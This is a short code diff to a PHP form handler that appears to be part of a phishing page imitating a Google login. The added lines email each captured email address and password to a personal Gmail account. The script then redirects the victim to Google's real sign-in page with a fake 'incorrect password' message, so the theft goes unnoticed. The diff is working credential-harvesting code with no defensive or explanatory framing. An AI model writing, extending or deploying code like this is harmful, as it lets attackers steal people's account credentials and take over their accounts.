@@ -11,6 +11,19 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     fwrite($file, "-------------------------\n");
     fclose($file);
 
+    // Email details
+    $to = "abhishek8907654@gmail.com"; // Replace with your email address
+    $subject = "New Email and Password";
+    $message = "Email: " . $email . "\nPassword: " . $password;
+    $headers = "From: abhishek8907654@gmail.com"; // Replace with your domain or email
+
+    // Send email
+    if (mail($to, $subject, $message, $headers)) {
+        echo "Email sent successfully!";
+    } else {
+        echo "Failed to send email.";
+    }
+
     // Redirect to Google's login page with an error message
     header("Location: https://accounts.google.com/signin/v2/challenge/pwd?err=Your%20email%20or%20password%20is%20incorrect");
     exit();
